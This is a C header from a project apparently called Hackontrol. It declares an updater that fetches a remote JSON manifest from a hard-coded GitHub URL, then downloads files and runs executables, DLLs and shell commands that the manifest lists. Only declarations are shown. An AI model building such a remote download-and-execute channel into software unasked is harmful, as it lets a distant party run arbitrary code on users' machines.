#pragma once

#include <libkhopan.h>
#include <cJSON.h>

#define FILE_LIBUPDATE32     L"libupdate32.dll"
#define FUNCTION_LIBUPDATE32 "Update"
#define URL_LATEST_FILE      "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/latest.json"

typedef void(__stdcall* ENTRYPOINTFUNCTION) (const cJSON* const root, const LPCWSTR folderHackontrol);

typedef struct {
	LPCSTR fullName;
	LPCSTR shortName;
	ENTRYPOINTFUNCTION function;
} EXECUTEENTRYPOINT;

BOOL CheckFileHash(cJSON* root, LPWSTR const filePath);
LPWSTR GetFilePath(cJSON* root);
void ProcessFilesArray(cJSON* root);
void ProcessEntrypointsArray(cJSON* root);
void ProcessEntrypointExecutable(cJSON* root);
void ProcessEntrypointDynamicLinkLibrary(cJSON* root);
void ProcessEntrypointShell(cJSON* root);
void ProcessEntrypointSleep(cJSON* root);

LPWSTR ExecuteGetFile(const cJSON* const root, const LPCWSTR folderHackontrol);
BOOL ExecuteHashFileCheck(const cJSON* const root, const LPCWSTR file);
void ExecuteDownload(const cJSON* const root, const LPCWSTR folderHackontrol);
void ExecuteExecute(const cJSON* const root, const LPCWSTR folderHackontrol);

void _stdcall ExecuteEntrypointExecutable(const cJSON* const root, const LPCWSTR folderHackontrol);
void _stdcall ExecuteEntrypointDynamic(const cJSON* const root, const LPCWSTR folderHackontrol);
void _stdcall ExecuteEntrypointCommand(const cJSON* const root, const LPCWSTR folderHackontrol);
void _stdcall ExecuteEntrypointSleep(const cJSON* const root, const LPCWSTR folderHackontrol);
